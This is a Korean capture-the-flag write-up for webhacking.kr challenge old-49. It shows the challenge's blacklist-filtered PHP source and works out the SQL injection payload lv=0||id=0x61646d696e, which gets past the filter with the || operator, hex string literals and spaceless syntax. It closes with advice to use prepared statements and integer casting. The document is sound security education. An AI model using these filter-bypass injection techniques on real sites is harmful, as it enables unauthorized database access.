[webhacking.kr](https://webhacking.kr)의 **old-49** 문제를 풀었다.
`lv` 값이 **따옴표 없이 숫자 자리에 그대로 들어가는** SQL 인젝션인데,
핵심은 서버가 `or`·`and`·공백·따옴표·괄호·콤마까지 **블랙리스트로 다 막아 둔** 상황에서,
**`||` 연산자**와 **16진수 문자열 리터럴**, 그리고 **공백 없는 문법**만으로 그 필터를 전부 피해
`admin` 행을 끌어오는 것이다.

"`' or 1=1`" 같은 교과서 페이로드가 **왜 여기서는 한 글자도 통하지 않는지**,
그리고 그걸 **어떤 대체 문법으로 바꿔 끼우는지**를 단계별로 정리한다.
아래 내용은 전부 **실제로 서버에 요청을 넣어 응답을 확인한 것**이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-49 (`/challenge/web-24/`) |
| 유형 | SQL 인젝션 (정수 컨텍스트) / 블랙리스트 우회 |
| 배점 | 30점 |
| 목표 | 질의 결과의 `id`가 **`admin`** 이 되도록 만들어 통과 |

페이지에는 `level :` 입력창 하나가 있고, 숫자를 넣으면 그 레벨의 `id`를 보여준다.

## 2. 정보 수집 — 소스 코드

하단 `view-source`(`?view_source=1`)로 전체 로직이 공개된다.

```php
<?php
  if($_GET['lv']){
    $db = dbconnect();
    if(preg_match("/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",$_GET['lv']))
      exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall49 where lv={$_GET['lv']}"));
    echo $result[0];
    if($result[0]=="admin") solve(49);
  }
?>
```

읽어 보면 구조가 명확하다.

- `lv` 값이 **따옴표 없이** 질의에 들어간다: `... where lv={$_GET['lv']}` → **정수 컨텍스트** 인젝션.
- 통과 조건은 결과 `id`가 `admin`인 것.
- 그런데 입력에 다음이 하나라도 있으면 바로 `no hack`:
  `select`, `or`, `and`, `(`, `)`, `limit`, `,`(콤마), `/`, `order`, `cash`, **공백**, **탭**, `'`, `"`.

## 3. 정보 수집 — 어떤 행들이 있나

필터에 안 걸리는 **순수 정수**로 먼저 테이블을 훑었다.

| 입력 `lv` | 응답(`id`) |
| --- | --- |
| `1` | `ltusy` |
| `2` | `udnrg` |
| `3` | `fvvcg` |
| `0` | (빈 응답) |

레벨 1·2·3에는 **무작위 문자열 id**가 들어 있고, `admin`은 그 레벨들에는 없다.
즉 `admin`은 **다른(알 수 없는) lv 값**을 가진 별도 행이다.
그러므로 "특정 lv 숫자"로는 `admin`을 꺼낼 수 없고, **`id`를 직접 조건으로 거는 인젝션**이 필요하다.

## 4. 문제점 — 교과서 페이로드가 막히는 이유

목표 질의는 이렇게 되어야 한다 — "lv로는 아무것도 안 맞지만, **id가 admin인 행**은 끌어온다."

```sql
select id from chall49 where lv=0 or id='admin'
```

하지만 이 한 줄은 **블랙리스트에 전부 걸린다.**

- `or` → 차단
- 공백(` `) → 차단
- `'admin'`의 따옴표(`'`) → 차단

따옴표도 공백도 `or`도 못 쓴다. 그래서 **같은 의미를 내는 다른 문법**으로 하나씩 바꿔야 한다.

## 5. 익스플로잇 — 대체 문법으로 재작성

### 5-1. `or` → `||`

MySQL에서 논리합은 키워드 `or` 말고 **`||` 연산자**로도 쓸 수 있다.
`||`에는 `or`라는 **부분 문자열이 없으므로** `preg_match`의 `or` 패턴에 걸리지 않는다.
(마찬가지로 `and`는 `&&`로 대체 가능하다.)

### 5-2. `'admin'` → `0x61646d696e` (16진수 리터럴)

따옴표가 막히니 문자열을 **16진수 리터럴**로 표현한다.
MySQL은 `0x61646d696e` 를 문자열 `admin`으로 해석한다(`a`=0x61, `d`=0x64, …).
따옴표가 한 개도 필요 없다.

```text
'admin'  →  0x61646d696e
```

### 5-3. 공백 제거

`lv=0||id=0x61646d696e` 에는 **공백이 전혀 없다.** `||`·`=`는 피연산자와 붙여 써도 되므로
탭·공백 없이 그대로 유효한 문법이다. (`=`는 비교 연산자로, 필터 대상이 아니다.)

### 5-4. 완성된 페이로드

```text
lv = 0||id=0x61646d696e
```

필터 점검: `select`·`or`·`and`·`(`·`)`·`limit`·`,`·`/`·`order`·`cash`·공백·탭·`'`·`"` **어느 것도 포함하지 않는다.**
실제 질의는 다음이 된다.

```sql
select id from chall49 where lv=0 || id=0x61646d696e
```

`lv=0`은 아무 행도 맞히지 못하므로, **`id=admin`인 행 하나만** 결과로 돌아온다.

### 5-5. 실제 전송과 결과

```console
GET /challenge/web-24/?lv=0||id=0x61646d696e
→ level : admin
→ old-49 Pwned. You got 30point. Congratz!
```

결과 `id`가 `admin`으로 판정되어 `solve(49)`가 호출되고 통과했다.


## 7. 왜 취약한가 — 그리고 올바른 방어

**(1) 블랙리스트는 SQL 인젝션 방어가 아니다.**
`or`·`and`·공백·따옴표를 지운다고 인젝션이 막히지 않는다.
SQL은 같은 의미를 **여러 문법**으로 쓸 수 있다 — `or`↔`||`, `and`↔`&&`,
공백↔탭/주석(`/**/`), `'문자열'`↔`0x..`(16진수)/`char(..)`.
막을 토큰을 아무리 나열해도 **대체 표현**이 남는다.

**(2) 근본 해법은 입력을 질의 구조에서 분리하는 것 — 파라미터 바인딩.**
값은 질의 "문법"이 아니라 "데이터"로만 들어가야 한다.

```php
// 나쁨: 입력을 질의 문자열에 그대로 끼워 넣는다
$q = "select id from chall49 where lv={$_GET['lv']}";

// 좋음: 프리페어드 스테이트먼트로 값과 구조를 분리
$stmt = $db->prepare("select id from chall49 where lv=?");
$stmt->bind_param("i", $_GET['lv']);   // 정수로 바인딩
$stmt->execute();
```

**(3) 정수 자리는 정수로 강제한다.**
`lv`가 숫자여야 한다면 `(int)$_GET['lv']`로 캐스팅하거나 `ctype_digit`로 검증한다.
그러면 `0||id=0x..` 같은 **연산자·리터럴이 애초에 숫자가 아니어서** 무력화된다.

## 8. 정리

- old-49는 `lv`가 **따옴표 없이 숫자 자리**에 들어가는 SQL 인젝션이고, 통과 조건은 결과 `id==admin`이다.
- `admin`은 특정 lv로는 안 나오는 별도 행이라, **`id`를 직접 조건으로 거는 인젝션**이 필요하다.
- 필터가 `or`·공백·따옴표를 막지만, **`||`(=or)**, **`0x61646d696e`(=16진수 'admin')**, **공백 없는 문법**으로 전부 우회된다 → `lv=0||id=0x61646d696e`.
- 교훈: **블랙리스트는 우회 가능**하다 — 방어는 **파라미터 바인딩**과 **타입 강제**로 입력과 질의 구조를 분리하는 것이다.

> "어떤 문자를 지울까"가 아니라 "이 값이 질의의 **구조**에 끼어들 수 있는가"를 먼저 묻는다.
